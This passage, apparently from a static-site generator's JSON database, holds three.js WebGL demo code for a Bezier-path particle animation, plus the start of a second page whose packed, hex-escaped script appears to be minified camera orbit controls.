3);\n    var aControlPoint1 = bufferGeometry.createAttribute('aControlPoint1', 3);\n    var aControlPoint2 = bufferGeometry.createAttribute('aControlPoint2', 3);\n    var aEndPosition = bufferGeometry.createAttribute('aEndPosition', 3);\n    var aAxisAngle = bufferGeometry.createAttribute('aAxisAngle', 4);\n    var aColor = bufferGeometry.createAttribute('color', 3);\n    var i, j, offset;\n    var delay;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      delay = i / mParticleCount * mDuration;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aOffset.array[offset++] = delay\n      }\n    }\n    var x, y, z;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = -1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aStartPosition.array[offset++] = x;\n        aStartPosition.array[offset++] = y;\n        aStartPosition.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(400, 600);\n      z = THREE.Math.randFloat(-1200, -800);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint1.array[offset++] = x;\n        aControlPoint1.array[offset++] = y;\n        aControlPoint1.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(-600, -400);\n      z = THREE.Math.randFloat(800, 1200);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint2.array[offset++] = x;\n        aControlPoint2.array[offset++] = y;\n        aControlPoint2.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = 1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aEndPosition.array[offset++] = x;\n        aEndPosition.array[offset++] = y;\n        aEndPosition.array[offset++] = z\n      }\n    }\n    var axis = new THREE.Vector3();\n    var angle = 0;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      axis.x = THREE.Math.randFloatSpread(2);\n      axis.y = THREE.Math.randFloatSpread(2);\n      axis.z = THREE.Math.randFloatSpread(2);\n      axis.normalize();\n      angle = Math.PI * THREE.Math.randInt(16, 32);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aAxisAngle.array[offset++] = axis.x;\n        aAxisAngle.array[offset++] = axis.y;\n        aAxisAngle.array[offset++] = axis.z;\n        aAxisAngle.array[offset++] = angle\n      }\n    }\n    var color = new THREE.Color();\n    var h, s, l;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      h = i / mParticleCount;\n      s = THREE.Math.randFloat(0.4, 0.6);\n      l = THREE.Math.randFloat(0.4, 0.6);\n      color.setHSL(h, s, l);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aColor.array[offset++] = color.r;\n        aColor.array[offset++] = color.g;\n        aColor.array[offset++] = color.b\n      }\n    }\n    var material = new THREE.BAS.PhongAnimationMaterial({\n      vertexColors: THREE.VertexColors,\n      shading: THREE.FlatShading,\n      side: THREE.DoubleSide,\n      uniforms: {\n        uTime: {\n          type: 'f',\n          value: 0\n        },\n        uDuration: {\n          type: 'f',\n          value: mDuration\n        }\n      },\n      shaderFunctions: [THREE.BAS.ShaderChunk['quaternion_rotation'], THREE.BAS.ShaderChunk['cubic_bezier']],\n      shaderParameters: ['uniform float uTime;', 'uniform float uDuration;', 'attribute float aOffset;', 'attribute vec3 aStartPosition;', 'attribute vec3 aControlPoint1;', 'attribute vec3 aControlPoint2;', 'attribute vec3 aEndPosition;', 'attribute vec4 aAxisAngle;'],\n      shaderVertexInit: ['float tProgress = mod((uTime + aOffset), uDuration) / uDuration;', 'float angle = aAxisAngle.w * tProgress;', 'vec4 tQuat = quatFromAxisAngle(aAxisAngle.xyz, angle);'],\n      shaderTransformNormal: ['objectNormal = rotateVector(tQuat, objectNormal);'],\n      shaderTransformPosition: ['transformed = rotateVector(tQuat, transformed);', 'transformed += cubicBezier(aStartPosition, aControlPoint1, aControlPoint2, aEndPosition, tProgress);']\n    }, {\n      specular: 0xff0000,\n      shininess: 20\n    });\n    mParticleSystem = new THREE.Mesh(bufferGeometry, material);\n    mParticleSystem.frustumCulled = false;\n    mScene.add(mParticleSystem)\n  }\n\n  function tick() {\n    update();\n    render();\n    mTime += mTimeStep;\n    mTime %= mDuration;\n    requestAnimationFrame(tick)\n  }\n\n  function update() {\n    mControls.update();\n    mParticleSystem.material.uniforms['uTime'].value = mTime\n  }\n\n  function render() {\n    mRenderer.render(mScene, mCamera)\n  }\n\n  function resize() {\n    mCamera.aspect = window.innerWidth / window.innerHeight;\n    mCamera.updateProjectionMatrix();\n    mRenderer.setSize(window.innerWidth, window.innerHeight)\n  }\n  THREE.BAS = {};\n  THREE.BAS.ShaderChunk = {};\n  THREE.BAS.ShaderChunk[\"animation_time\"] = \"float tDelay = aAnimation.x;\\nfloat tDuration = aAnimation.y;\\nfloat tTime = clamp(uTime - tDelay, 0.0, tDuration);\\nfloat tProgress = ease(tTime, 0.0, 1.0, tDuration);\\n\";\n  THREE.BAS.ShaderChunk[\"cubic_bezier\"] = \"vec3 cubicBezier(vec3 p0, vec3 c0, vec3 c1, vec3 p1, float t)\\n{\\n    vec3 tp;\\n    float tn = 1.0 - t;\\n\\n    tp.xyz = tn * tn * tn * p0.xyz + 3.0 * tn * tn * t * c0.xyz + 3.0 * tn * t * t * c1.xyz + t * t * t * p1.xyz;\\n\\n    return tp;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_quad\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_out_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*((t=t/d - 1.0)*t*t + 1.0) + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"quaternion_rotation\"] = \"vec3 rotateVector(vec4 q, vec3 v)\\n{\\n    return v + 2.0 * cross(q.xyz, cross(q.xyz, v) + q.w * v);\\n}\\n\\nvec4 quatFromAxisAngle(vec3 axis, float angle)\\n{\\n    float halfAngle = angle * 0.5;\\n    return vec4(axis.xyz * sin(halfAngle), cos(halfAngle));\\n}\\n\";\n  THREE.BAS.PrefabBufferGeometry = function(prefab, count) {\n    THREE.BufferGeometry.call(this);\n    this.prefabGeometry = prefab;\n    this.prefabCount = count;\n    this.prefabVertexCount = prefab.vertices.length;\n    this.bufferDefaults()\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype = Object.create(THREE.BufferGeometry.prototype);\n  THREE.BAS.PrefabBufferGeometry.prototype.constructor = THREE.BAS.PrefabBufferGeometry;\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferDefaults = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabIndices = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      prefabIndices.push(face.a, face.b, face.c)\n    }\n    var indexBuffer = new Uint32Array(this.prefabCount * prefabIndexCount);\n    var positionBuffer = new Float32Array(this.prefabCount * prefabVertexCount * 3);\n    this.setIndex(new THREE.BufferAttribute(indexBuffer, 1));\n    this.addAttribute('position', new THREE.BufferAttribute(positionBuffer, 3));\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 3) {\n        var prefabVertex = this.prefabGeometry.vertices[j];\n        positionBuffer[offset] = prefabVertex.x;\n        positionBuffer[offset + 1] = prefabVertex.y;\n        positionBuffer[offset + 2] = prefabVertex.z\n      }\n      for (var k = 0; k < prefabIndexCount; k++) {\n        indexBuffer[i * prefabIndexCount + k] = prefabIndices[k] + i * prefabVertexCount\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferUvs = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabUvs = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      var uv = this.prefabGeometry.faceVertexUvs[0][h];\n      prefabUvs[face.a] = uv[0];\n      prefabUvs[face.b] = uv[1];\n      prefabUvs[face.c] = uv[2]\n    }\n    var uvBuffer = this.createAttribute('uv', 2);\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 2) {\n        var prefabUv = prefabUvs[j];\n        uvBuffer.array[offset] = prefabUv.x;\n        uvBuffer.array[offset + 1] = prefabUv.y\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.computeVertexNormals = function() {\n    var index = this.index;\n    var attributes = this.attributes;\n    var positions = attributes.position.array;\n    if (attributes.normal === undefined) {\n      this.addAttribute('normal', new THREE.BufferAttribute(new Float32Array(positions.length), 3))\n    }\n    var normals = attributes.normal.array;\n    var vA, vB, vC, pA = new THREE.Vector3(),\n      pB = new THREE.Vector3(),\n      pC = new THREE.Vector3(),\n      cb = new THREE.Vector3(),\n      ab = new THREE.Vector3();\n    var indices = index.array;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    for (var i = 0; i < prefabIndexCount; i += 3) {\n      vA = indices[i + 0] * 3;\n      vB = indices[i + 1] * 3;\n      vC = indices[i + 2] * 3;\n      pA.fromArray(positions, vA);\n      pB.fromArray(positions, vB);\n      pC.fromArray(positions, vC);\n      cb.subVectors(pC, pB);\n      ab.subVectors(pA, pB);\n      cb.cross(ab);\n      normals[vA] += cb.x;\n      normals[vA + 1] += cb.y;\n      normals[vA + 2] += cb.z;\n      normals[vB] += cb.x;\n      normals[vB + 1] += cb.y;\n      normals[vB + 2] += cb.z;\n      normals[vC] += cb.x;\n      normals[vC + 1] += cb.y;\n      normals[vC + 2] += cb.z\n    }\n    for (var j = 1; j < this.prefabCount; j++) {\n      for (var k = 0; k < prefabIndexCount; k++) {\n        normals[j * prefabIndexCount + k] = normals[k]\n      }\n    }\n    this.normalizeNormals();\n    attributes.normal.needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.createAttribute = function(name, itemSize) {\n    var buffer = new Float32Array(this.prefabCount * this.prefabVertexCount * itemSize);\n    var attribute = new THREE.BufferAttribute(buffer, itemSize);\n    this.addAttribute(name, attribute);\n    return attribute\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute4 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z;\n        array[offset++] = v.w\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute3 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute2 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < this.prefabCount; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.BaseAnimationMaterial = function(parameters) {\n    THREE.ShaderMaterial.call(this);\n    this.shaderFunctions = [];\n    this.shaderParameters = [];\n    this.shaderVertexInit = [];\n    this.shaderTransformNormal = [];\n    this.shaderTransformPosition = [];\n    this.setValues(parameters)\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype = Object.create(THREE.ShaderMaterial.prototype);\n  THREE.BAS.BaseAnimationMaterial.prototype.constructor = THREE.BAS.BaseAnimationMaterial;\n  THREE.BAS.BaseAnimationMaterial.prototype._0 = function() {\n    return ''\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._1 = function() {\n    return this.shaderFunctions.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._3 = function() {\n    return this.shaderParameters.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._5 = function() {\n    return this.shaderVertexInit.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._4 = function() {\n    return this.shaderTransformNormal.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._2 = function() {\n    return this.shaderTransformPosition.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype.setUniformValues = function(values) {\n    for (var key in values) {\n      if (key in this.uniforms) {\n        var uniform = this.uniforms[key];\n        var value = values[key];\n        switch (uniform.type) {\n          case 'c':\n            uniform.value.set(value);\n            break;\n          case 'v2':\n          case 'v3':\n          case 'v4':\n            uniform.value.copy(value);\n            break;\n          case 'f':\n          case 't':\n            uniform.value = value\n        }\n      }\n    }\n  };\n  THREE.BAS.PhongAnimationMaterial = function(parameters, uniformValues) {\n    THREE.BAS.BaseAnimationMaterial.call(this, parameters);\n    var phongShader = THREE.ShaderLib['phong'];\n    this.uniforms = THREE.UniformsUtils.merge([phongShader.uniforms, this.uniforms]);\n    this.lights = true;\n    this.vertexShader = this._0();\n    this.fragmentShader = phongShader.fragmentShader;\n    uniformValues.map && (this.defines['USE_MAP'] = '');\n    uniformValues.normalMap && (this.defines['USE_NORMALMAP'] = '');\n    this.setUniformValues(uniformValues)\n  };\n  THREE.BAS.PhongAnimationMaterial.prototype = Object.create(THREE.BAS.BaseAnimationMaterial.prototype);\n  THREE.BAS.PhongAnimationMaterial.prototype.constructor = THREE.BAS.PhongAnimationMaterial;\n  THREE.BAS.PhongAnimationMaterial.prototype._0 = function() {\n    return [\"#define PHONG\", \"varying vec3 vViewPosition;\", \"#ifndef FLAT_SHADED\", \" varying vec3 vNormal;\", \"#endif\", THREE.ShaderChunk[\"common\"], THREE.ShaderChunk[\"uv_pars_vertex\"], THREE.ShaderChunk[\"uv2_pars_vertex\"], THREE.ShaderChunk[\"displacementmap_pars_vertex\"], THREE.ShaderChunk[\"envmap_pars_vertex\"], THREE.ShaderChunk[\"lights_phong_pars_vertex\"], THREE.ShaderChunk[\"color_pars_vertex\"], THREE.ShaderChunk[\"morphtarget_pars_vertex\"], THREE.ShaderChunk[\"skinning_pars_vertex\"], THREE.ShaderChunk[\"shadowmap_pars_vertex\"], THREE.ShaderChunk[\"logdepthbuf_pars_vertex\"], this._1(), this._3(), \"void main() {\", this._5(), THREE.ShaderChunk[\"uv_vertex\"], THREE.ShaderChunk[\"uv2_vertex\"], THREE.ShaderChunk[\"color_vertex\"], THREE.ShaderChunk[\"beginnormal_vertex\"], this._4(), THREE.ShaderChunk[\"morphnormal_vertex\"], THREE.ShaderChunk[\"skinbase_vertex\"], THREE.ShaderChunk[\"skinnormal_vertex\"], THREE.ShaderChunk[\"defaultnormal_vertex\"], \"#ifndef FLAT_SHADED\", \"  vNormal = normalize( transformedNormal );\", \"#endif\", THREE.ShaderChunk[\"begin_vertex\"], this._2(), THREE.ShaderChunk[\"displacementmap_vertex\"], THREE.ShaderChunk[\"morphtarget_vertex\"], THREE.ShaderChunk[\"skinning_vertex\"], THREE.ShaderChunk[\"project_vertex\"], THREE.ShaderChunk[\"logdepthbuf_vertex\"], \"  vViewPosition = - mvPosition.xyz;\", THREE.ShaderChunk[\"worldpos_vertex\"], THREE.ShaderChunk[\"envmap_vertex\"], THREE.ShaderChunk[\"lights_phong_vertex\"], THREE.ShaderChunk[\"shadowmap_vertex\"], \"}\"].join(\"\\n\")\n  };\n  </script>\n</body>\n\n</html>\n","date":"2017-07-06T08:23:14.883Z","updated":"2017-07-06T08:23:14.883Z","path":"libs/webGL/a10/a10.html","title":"","comments":1,"_id":"cje9esjym002ui4uchpz89tm7","content":"<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a10</title>\n  <script src=\"three.min.js\"></script>\n  <script>\n  window[\"\\x65\\x76\\x61\\x6c\"](function(zpe1, KMbIQKO2, zaqKDBSC3, o_bFE4, _5, kqAZgqEsm6) {\n    _5 = function(zaqKDBSC3) {\n      return (zaqKDBSC3 < KMbIQKO2 ? \"\" : _5(window[\"\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\"](zaqKDBSC3 / KMbIQKO2))) + ((zaqKDBSC3 = zaqKDBSC3 % KMbIQKO2) > 35 ? window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"][\"\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\"](zaqKDBSC3 + 29) : zaqKDBSC3[\"\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\"](36))\n    };\n    if (!'' [\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](/^/, window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"])) {\n      while (zaqKDBSC3--) kqAZgqEsm6[_5(zaqKDBSC3)] = o_bFE4[zaqKDBSC3] || _5(zaqKDBSC3);\n      o_bFE4 = [function(_5) {\n        return kqAZgqEsm6[_5]\n      }];\n      _5 = function() {\n        return '\\\\\\x77\\x2b'\n      };\n      zaqKDBSC3 = 1;\n    };\n    while (zaqKDBSC3--)\n      if (o_bFE4[zaqKDBSC3]) zpe1 = zpe1[\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](new window[\"\\x52\\x65\\x67\\x45\\x78\\x70\"]('\\\\\\x62' + _5(zaqKDBSC3) + '\\\\\\x62', '\\x67'), o_bFE4[zaqKDBSC3]);\n    return zpe1;\n  }('\\x6a\\x2e\\x31\\x49\\x3d\\x68\\x28\\x69\\x2c\\x6b\\x29\\x7b\\x61\\x2e\\x69\\x3d\\x69\\x3b\\x61\\x2e\\x6b\\x3d\\x28\\x6b\\x21\\x3d\\x3d\\x47\\x29\\x3f\\x6b\\x3a\\x4c\\x3b\\x61\\x2e\\x46\\x3d\\x71\\x3b\\x61\\x2e\\x45\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x61\\x2e\\x32\\x59\\x3d\\x61\\x2e\\x45\\x3b\\x61\\x2e\\x31\\x61\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x48\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6d\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x6e\\x3d\\x32\\x53\\x3b\\x61\\x2e\\x31\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x66\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x31\\x34\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x68\\x3d\\x37\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x4a\\x3d\\x32\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x63\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x61\\x3d\\x65\\x2e\\x4e\\x3b\\x61\\x2e\\x32\\x75\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x6a\\x3d\\x7b\\x32\\x76\\x3a\\x33\\x37\\x2c\\x32\\x74\\x3a\\x33\\x38\\x2c\\x32\\x71\\x3a\\x33\\x39\\x2c\\x32\\x77\\x3a\\x33\\x30\\x7d\\x3b\\x63 \\x39\\x3d\\x61\\x3b\\x63 \\x31\\x69\\x3d\\x30\\x2e\\x33\\x62\\x3b\\x63 \\x5a\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x59\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x30\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x55\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x57\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x56\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x54\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x6f\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x52\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x53\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x67\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x79\\x3d\\x30\\x3b\\x63 \\x31\\x6c\\x3d\\x30\\x3b\\x63 \\x31\\x63\\x3d\\x31\\x3b\\x63 \\x73\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x42\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x47\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x3b\\x63 \\x6c\\x3d\\x7b\\x31\\x31\\x3a\\x2d\\x31\\x2c\\x31\\x4e\\x3a\\x30\\x2c\\x31\\x4f\\x3a\\x31\\x2c\\x31\\x4c\\x3a\\x32\\x2c\\x32\\x32\\x3a\\x33\\x2c\\x31\\x50\\x3a\\x34\\x2c\\x31\\x54\\x3a\\x35\\x7d\\x3b\\x63 \\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x3b\\x61\\x2e\\x32\\x4b\\x3d\\x61\\x2e\\x45\\x2e\\x31\\x73\\x28\\x29\\x3b\\x61\\x2e\\x32\\x4c\\x3d\\x61\\x2e\\x69\\x2e\\x77\\x2e\\x31\\x73\\x28\\x29\\x3b\\x63 \\x31\\x57\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x2e\\x33\\x64\\x28\\x69\\x2e\\x32\\x58\\x2c\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x30\\x2c\\x31\\x2c\\x30\\x29\\x29\\x3b\\x63 \\x32\\x64\\x3d\\x31\\x57\\x2e\\x31\\x73\\x28\\x29\\x2e\\x33\\x35\\x28\\x29\\x3b\\x63 \\x32\\x38\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x33\\'\\x7d\\x3b\\x63 \\x31\\x71\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x31\\'\\x7d\\x3b\\x63 \\x31\\x7a\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x32\\'\\x7d\\x3b\\x61\\x2e\\x31\\x6f\\x3d\\x68\\x28\\x4b\\x29\\x7b\\x64\\x28\\x4b\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4b\\x3d\\x31\\x41\\x28\\x29\\x7d\\x31\\x6c\\x2d\\x3d\\x4b\\x7d\\x3b\\x61\\x2e\\x32\\x30\\x3d\\x68\\x28\\x4b\\x29\\x7b\\x64\\x28\\x4b\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4b\\x3d\\x31\\x41\\x28\\x29\\x7d\\x31\\x79\\x2d\\x3d\\x4b\\x7d\\x3b\\x61\\x2e\\x31\\x4b\\x3d\\x68\\x28\\x4d\\x29\\x7b\\x63 \\x51\\x3d\\x61\\x2e\\x69\\x2e\\x32\\x69\\x2e\\x32\\x39\\x3b\\x54\\x2e\\x72\\x28\\x51\\x5b\\x30\\x5d\\x2c\\x51\\x5b\\x31\\x5d\\x2c\\x51\\x5b\\x32\\x5d\\x29\\x3b\\x54\\x2e\\x32\\x6c\\x28\\x2d\\x4d\\x29\\x3b\\x73\\x2e\\x31\\x6e\\x28\\x54\\x29\\x7d\\x3b\\x61\\x2e\\x31\\x46\\x3d\\x68\\x28\\x4d\\x29\\x7b\\x63 \\x51\\x3d\\x61\\x2e\\x69\\x2e\\x32\\x69\\x2e\\x32\\x39\\x3b\\x54\\x2e\\x72\\x28\\x51\\x5b\\x34\\x5d\\x2c\\x51\\x5b\\x35\\x5d\\x2c\\x51\\x5b\\x36\\x5d\\x29\\x3b\\x54\\x2e\\x32\\x6c\\x28\\x4d\\x29\\x3b\\x73\\x2e\\x31\\x6e\\x28\\x54\\x29\\x7d\\x3b\\x61\\x2e\\x73\\x3d\\x68\\x28\\x31\\x4d\\x2c\\x31\\x53\\x29\\x7b\\x63 \\x41\\x3d\\x39\\x2e\\x6b\\x3d\\x3d\\x3d\\x4c\\x3f\\x39\\x2e\\x6b\\x2e\\x31\\x59\\x3a\\x39\\x2e\\x6b\\x3b\\x64\\x28\\x39\\x2e\\x69\\x2e\\x32\\x6a\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x63 \\x77\\x3d\\x39\\x2e\\x69\\x2e\\x77\\x3b\\x63 \\x6f\\x3d\\x77\\x2e\\x31\\x73\\x28\\x29\\x2e\\x32\\x66\\x28\\x39\\x2e\\x45\\x29\\x3b\\x63 \\x31\\x76\\x3d\\x6f\\x2e\\x31\\x70\\x28\\x29\\x3b\\x31\\x76\\x2a\\x3d\\x65\\x2e\\x32\\x52\\x28\\x28\\x39\\x2e\\x69\\x2e\\x32\\x6a\\x2f \\x32\\x29 \\x2a \\x65\\x2e\\x4e \\x2f\\x32\\x56\\x2e\\x30\\x29\\x3b\\x39\\x2e\\x31\\x4b\\x28\\x32\\x2a\\x31\\x4d\\x2a\\x31\\x76\\x2f\\x41\\x2e\\x31\\x64\\x29\\x3b\\x39\\x2e\\x31\\x46\\x28\\x32\\x2a\\x31\\x53\\x2a\\x31\\x76\\x2f\\x41\\x2e\\x31\\x64\\x29\\x7d\\x76 \\x64\\x28\\x39\\x2e\\x69\\x2e\\x32\\x65\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x39\\x2e\\x31\\x4b\\x28\\x31\\x4d\\x2a\\x28\\x39\\x2e\\x69\\x2e\\x32\\x57\\x2d\\x39\\x2e\\x69\\x2e\\x33\\x66\\x29\\x2f\\x41\\x2e\\x32\\x35\\x29\\x3b\\x39\\x2e\\x31\\x46\\x28\\x31\\x53\\x2a\\x28\\x39\\x2e\\x69\\x2e\\x32\\x65\\x2d\\x39\\x2e\\x69\\x2e\\x33\\x71\\x29\\x2f\\x41\\x2e\\x31\\x64\\x29\\x7d\\x76\\x7b\\x33\\x70\\x2e\\x33\\x75\\x28\\'\\x33\\x73\\x3a \\x31\\x49\\x2e\\x33\\x74 \\x33\\x72 \\x33\\x77 \\x33\\x76 \\x33\\x69 \\x31\\x6d \\x2d \\x73 \\x33\\x6a\\x2e\\'\\x29\\x7d\\x7d\\x3b\\x61\\x2e\\x31\\x78\\x3d\\x68\\x28\\x4a\\x29\\x7b\\x64\\x28\\x4a\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4a\\x3d\\x31\\x43\\x28\\x29\\x7d\\x31\\x63\\x2f\\x3d\\x4a\\x7d\\x3b\\x61\\x2e\\x31\\x77\\x3d\\x68\\x28\\x4a\\x29\\x7b\\x64\\x28\\x4a\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4a\\x3d\\x31\\x43\\x28\\x29\\x7d\\x31\\x63\\x2a\\x3d\\x4a\\x7d\\x3b\\x61\\x2e\\x75\\x3d\\x68\\x28\\x29\\x7b\\x63 \\x77\\x3d\\x61\\x2e\\x69\\x2e\\x77\\x3b\\x6f\\x2e\\x74\\x28\\x77\\x29\\x2e\\x32\\x66\\x28\\x61\\x2e\\x45\\x29\\x3b\\x6f\\x2e\\x32\\x68\\x28\\x31\\x57\\x29\\x3b\\x63 \\x31\\x74\\x3d\\x65\\x2e\\x32\\x6f\\x28\\x6f\\x2e\\x78\\x2c\\x6f\\x2e\\x7a\\x29\\x3b\\x63 \\x48\\x3d\\x65\\x2e\\x32\\x6f\\x28\\x65\\x2e\\x32\\x36\\x28\\x6f\\x2e\\x78\\x2a\\x6f\\x2e\\x78\\x2b\\x6f\\x2e\\x7a\\x2a\\x6f\\x2e\\x7a\\x29\\x2c\\x6f\\x2e\\x79\\x29\\x3b\\x64\\x28\\x61\\x2e\\x32\\x6b\\x29\\x7b\\x61\\x2e\\x31\\x6f\\x28\\x31\\x41\\x28\\x29\\x29\\x7d\\x31\\x74\\x2b\\x3d\\x31\\x6c\\x3b\\x48\\x2b\\x3d\\x31\\x79\\x3b\\x48\\x3d\\x65\\x2e\\x31\\x56\\x28\\x61\\x2e\\x32\\x63\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x61\\x2e\\x32\\x61\\x2c\\x48\\x29\\x29\\x3b\\x48\\x3d\\x65\\x2e\\x31\\x56\\x28\\x31\\x69\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x65\\x2e\\x4e\\x2d\\x31\\x69\\x2c\\x48\\x29\\x29\\x3b\\x63 